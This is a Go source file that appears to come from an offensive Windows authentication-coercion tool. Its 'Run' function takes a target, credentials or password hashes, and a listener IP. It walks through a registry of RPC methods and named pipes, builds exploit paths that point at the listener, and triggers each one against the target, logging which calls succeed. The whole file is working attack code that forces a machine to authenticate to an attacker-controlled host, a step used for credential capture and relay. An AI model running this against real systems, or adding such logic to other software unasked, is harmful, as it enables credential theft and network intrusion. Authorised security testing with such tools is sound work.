package mode_coerce

import (
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/TheManticoreProject/Manticore/logger"
	"github.com/TheManticoreProject/Manticore/windows/credentials"

	"github.com/TheManticoreProject/manticore-coercer/filter"
	"github.com/TheManticoreProject/manticore-coercer/methods"
	"github.com/TheManticoreProject/manticore-coercer/modes/common"
	"github.com/TheManticoreProject/manticore-coercer/results"
)

type Options struct {
	Target         string
	ListenerIP     string
	AlwaysContinue bool

	Domain   string
	Username string
	Password string
	Hashes   string

	SMBPort  int
	DCEPort  int
	HTTPPort int

	Filter     filter.Filter
	Delay      time.Duration
	ExportJSON string
	ExportXLSX string
	Timeout    time.Duration
	PathIP     string
}

func Run(opts Options) []results.MethodResult {
	registry := methods.DefaultRegistry()
	httpPort := opts.HTTPPort
	if httpPort == 0 {
		httpPort = 80
	}
	vars := methods.TemplateVars{
		ListenerIP: common.EffectivePathIP(opts.PathIP, opts.ListenerIP),
		SMBPort:    445,
		HTTPPort:   httpPort,
	}

	creds, err := credentials.NewCredentials(opts.Domain, opts.Username, opts.Password, opts.Hashes)
	if err != nil {
		logger.Warn(fmt.Sprintf("Invalid credentials: %s", err))
		return nil
	}

	connOpts := common.ConnectOpts{
		Target:  opts.Target,
		SMBPort: opts.SMBPort,
		DCEPort: opts.DCEPort,
		Timeout: opts.Timeout,
	}

	var allResults []results.MethodResult
	stopped := false

	for _, m := range registry.All() {
		if stopped {
			break
		}
		if !opts.Filter.MatchMethod(m) {
			continue
		}

		for _, access := range m.Access {
			if stopped {
				break
			}
			if !opts.Filter.MatchAccess(access) {
				continue
			}

			for _, ep := range m.ExploitPaths {
				if stopped {
					break
				}

				exploitPath := methods.RenderPath(ep.Template, vars)
				logger.Info(fmt.Sprintf("    %s", m.FormatCall(exploitPath)))

				trigger := common.TryTrigger(connOpts, m, access, exploitPath, creds)
				outcome := results.ClassifyOutcome(trigger)

				mr := results.MethodResult{
					Target:      opts.Target,
					Transport:   access.Transport.String(),
					Pipe:        access.Pipe,
					Protocol:    m.Protocol,
					Function:    m.Function,
					Opnum:       m.Opnum,
					ExploitPath: exploitPath,
					Trigger:     trigger,
					Outcome:     outcome,
				}
				allResults = append(allResults, mr)
				printResult(mr)

				if !opts.AlwaysContinue {
					action := promptAction()
					switch action {
					case "skip":
						continue
					case "stop":
						stopped = true
						continue
					}
				}

				if opts.Delay > 0 {
					time.Sleep(opts.Delay)
				}
			}
		}
	}

	if opts.ExportJSON != "" {
		exportJSON(opts.ExportJSON, opts.Target, allResults)
	}
	if opts.ExportXLSX != "" {
		if err := results.ExportMethodsXLSX(opts.ExportXLSX, allResults); err != nil {
			logger.Warn(fmt.Sprintf("Cannot write XLSX export: %s", err))
		} else {
			logger.Info(fmt.Sprintf("  Results exported to %s", opts.ExportXLSX))
		}
	}

	return allResults
}

type jsonExport struct {
	Target  string             `json:"target"`
	Results []jsonMethodResult `json:"results"`
}

type jsonMethodResult struct {
	Protocol    string `json:"protocol"`
	Function    string `json:"function"`
	Opnum       uint16 `json:"opnum"`
	Transport   string `json:"transport"`
	Pipe        string `json:"pipe,omitempty"`
	ExploitPath string `json:"exploit_path"`
	Outcome     string `json:"outcome"`
	Status      uint32 `json:"status"`
}

func exportJSON(path, target string, allResults []results.MethodResult) {
	export := jsonExport{Target: target}
	for _, mr := range allResults {
		export.Results = append(export.Results, jsonMethodResult{
			Protocol:    mr.Protocol,
			Function:    mr.Function,
			Opnum:       mr.Opnum,
			Transport:   mr.Transport,
			Pipe:        mr.Pipe,
			ExploitPath: mr.ExploitPath,
			Outcome:     mr.Outcome.String(),
			Status:      mr.Trigger.Status,
		})
	}
	data, err := json.MarshalIndent(export, "", "  ")
	if err != nil {
		logger.Warn(fmt.Sprintf("JSON export failed: %s", err))
		return
	}
	if err := os.WriteFile(path, data, 0644); err != nil {
		logger.Warn(fmt.Sprintf("Cannot write JSON export: %s", err))
		return
	}
	logger.Info(fmt.Sprintf("  Results exported to %s", path))
}

func promptAction() string {
	fmt.Fprintf(os.Stderr, "      [c]ontinue / [s]kip / s[t]op (default: continue): ")
	scanner := bufio.NewScanner(os.Stdin)
	if !scanner.Scan() {
		return "continue"
	}
	switch strings.TrimSpace(strings.ToLower(scanner.Text())) {
	case "s", "skip":
		return "skip"
	case "t", "stop":
		return "stop"
	default:
		return "continue"
	}
}

func printResult(mr results.MethodResult) {
	status := mr.Trigger
	outcome := mr.Outcome

	switch outcome {
	case results.OutcomePathResolved:
		logger.Info(fmt.Sprintf("      \x1b[92m[+]\x1b[0m %s %s", outcome, methods.FormatStatus(status.Status)))
	case results.OutcomeSuccess:
		logger.Info(fmt.Sprintf("      \x1b[92m[+]\x1b[0m %s %s", outcome, methods.FormatStatus(status.Status)))
	case results.OutcomeAccessDenied:
		logger.Info(fmt.Sprintf("      \x1b[93m[!]\x1b[0m %s %s", outcome, methods.FormatStatus(status.Status)))
	case results.OutcomeFaulted:
		if status.Err != nil {
			logger.Info(fmt.Sprintf("      \x1b[91m[-]\x1b[0m %s: %s", outcome, status.Err))
		} else {
			logger.Info(fmt.Sprintf("      \x1b[91m[-]\x1b[0m %s", outcome))
		}
	case results.OutcomeNotAvailable:
		logger.Debug(fmt.Sprintf("      \x1b[90m[-]\x1b[0m %s %s", outcome, methods.FormatStatus(status.Status)))
	default:
		logger.Info(fmt.Sprintf("      \x1b[90m[?]\x1b[0m %s %s", outcome, methods.FormatStatus(status.Status)))
	}
}
